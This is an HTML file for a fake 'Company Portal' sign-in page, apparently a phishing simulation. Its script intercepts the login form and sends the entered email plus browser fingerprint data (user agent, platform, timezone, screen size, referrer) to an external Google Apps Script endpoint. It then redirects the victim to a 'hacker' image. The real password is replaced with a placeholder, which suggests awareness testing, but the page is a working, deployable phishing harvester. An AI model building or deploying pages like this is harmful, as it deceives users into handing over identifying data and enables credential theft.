<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Sign in</title>
  <style>
    :root{
      --bg:#0b1020; --card:rgba(255,255,255,.06);
      --line:rgba(255,255,255,.14); --text:#e9eefc; --muted:rgba(233,238,252,.72);
      --accent:#7c5cff; --accent2:#22d3ee; --shadow:0 24px 60px rgba(0,0,0,.55);
      --r:18px;
    }
    *{box-sizing:border-box}
    body{
      margin:0; min-height:100vh; display:grid; place-items:center; padding:24px;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
      color:var(--text);
      background:
        radial-gradient(1200px 600px at 20% 0%, rgba(124,92,255,.22), transparent 55%),
        radial-gradient(900px 500px at 90% 20%, rgba(34,211,238,.16), transparent 60%),
        linear-gradient(180deg, var(--bg), #070b14);
    }
    .card{
      width:min(420px,100%);
      background:linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border:1px solid var(--line);
      border-radius:var(--r);
      box-shadow:var(--shadow);
      padding:22px;
    }
    .brand{display:flex; align-items:center; gap:12px; margin-bottom:12px;}
    .logo{
      width:44px;height:44px;border-radius:14px; overflow:hidden;
      background:rgba(255,255,255,.06); border:1px solid var(--line);
      display:grid; place-items:center;
    }
    .logo img{width:100%;height:100%;object-fit:contain;padding:7px}
    h1{margin:0;font-size:18px;letter-spacing:.2px}
    .sub{margin:4px 0 0;color:var(--muted);font-size:13px;line-height:1.45}
    form{display:grid;gap:12px;margin-top:14px}
    label{display:block;font-size:13px;color:rgba(233,238,252,.82);margin-bottom:6px}
    .input{
      width:100%; padding:12px; border-radius:14px;
      border:1px solid rgba(255,255,255,.16);
      background:rgba(0,0,0,.22);
      color:var(--text); outline:none;
      transition:border-color .15s ease, box-shadow .15s ease;
      font-size:14px;
    }
    .input:focus{border-color:rgba(124,92,255,.55);box-shadow:0 0 0 4px rgba(124,92,255,.15)}
    .row{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:2px}
    .check{display:flex;align-items:center;gap:8px;color:var(--muted);font-size:13px;user-select:none}
    .check input{accent-color:var(--accent)}
    .link{color:rgba(233,238,252,.85);font-size:13px;text-decoration:none;border-bottom:1px dashed rgba(255,255,255,.22)}
    .link:hover{border-bottom-color:rgba(124,92,255,.55);color:#fff}
    .btn{
      margin-top:6px; width:100%;
      padding:12px 14px; border:none; border-radius:14px;
      background:linear-gradient(135deg, var(--accent), var(--accent2));
      color:#071025; font-weight:800; cursor:pointer; font-size:14px;
      box-shadow:0 14px 28px rgba(124,92,255,.18);
    }
    .status{
      margin-top:10px;
      padding:10px 12px;
      border-radius:14px;
      border:1px solid rgba(255,255,255,.14);
      background: rgba(0,0,0,.18);
      color: rgba(233,238,252,.75);
      font-size:12.5px;
      line-height:1.45;
      display:none;
      word-break:break-word;
    }
    .status.show{display:block}
    .foot{margin-top:12px;text-align:center;color:rgba(233,238,252,.55);font-size:12px}
  </style>
</head>
<body>
  <main class="card" aria-label="Login">
    <div class="brand">
      <div class="logo"><img src="logo.png" alt="Logo"></div>
      <div>
        <h1>Company Portal</h1>
        <div class="sub">Sign in to continue.</div>
      </div>
    </div>

    <form id="loginForm" autocomplete="on" novalidate>
      <div>
        <label for="email">Email</label>
        <input class="input" id="email" type="email" placeholder="name@company.com" required>
      </div>

      <div>
        <label for="password">Password</label>
        <input class="input" id="password" type="password" placeholder="••••••••" required minlength="6">
      </div>

      <div class="row">
        <label class="check"><input type="checkbox"> Remember me</label>
        <a class="link" href="#" onclick="return false;">Forgot password?</a>
      </div>

      <button class="btn" type="submit">Sign in</button>

      <div id="status" class="status" aria-live="polite"></div>
      <div class="foot">© <span id="y"></span> Company</div>
    </form>
  </main>

  <script>
    (function(){
      const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwLwaaMiCShGJf6r5DCNRJvdlrPq8bhiRlZmanJjRgttQ6bhbOLse9R7MMUKu_RjFUarQ/exec";
      const REDIRECT_URL = "https://wallpapers.com/images/hd/64k-ultra-hd-hacker-pointing-a-finger-5wpqy4x0adlwds3u.jpg";
      const FAKE_PASSWORD = "************";

      document.getElementById("y").textContent = new Date().getFullYear();
      const statusEl = document.getElementById("status");
      const showStatus = (m) => { statusEl.textContent = m; statusEl.classList.add("show"); };

      function payload(email){
        return {
          email,
          fakePassword: FAKE_PASSWORD,
          userAgent: navigator.userAgent || "",
          platform: navigator.platform || "",
          language: navigator.language || "",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
          screen: `${screen.width}x${screen.height}`,
          referrer: document.referrer || "",
          pageUrl: location.href
        };
      }

      document.getElementById("loginForm").addEventListener("submit", async (e) => {
        e.preventDefault();

        const email = document.getElementById("email").value.trim();
        const pw = document.getElementById("password").value;

        if (!email) return alert("Enter your email.");
        if (!pw || pw.length < 6) return alert("Enter your password (min 6 chars).");

        // Never store real password; replace UI with fake stars after submit
        document.getElementById("password").value = FAKE_PASSWORD;

        try{
          // Note: Apps Script may require mode:'no-cors' depending on your deployment.
          // Using no-cors means you can't read the response, but it will still send.
          await fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload(email))
          });

          showStatus("Signing in…");
          window.location.href = REDIRECT_URL;

        } catch(err){
          showStatus("Network error. Please try again.");
        }
      });
    })();
  </script>
</body>
</html>
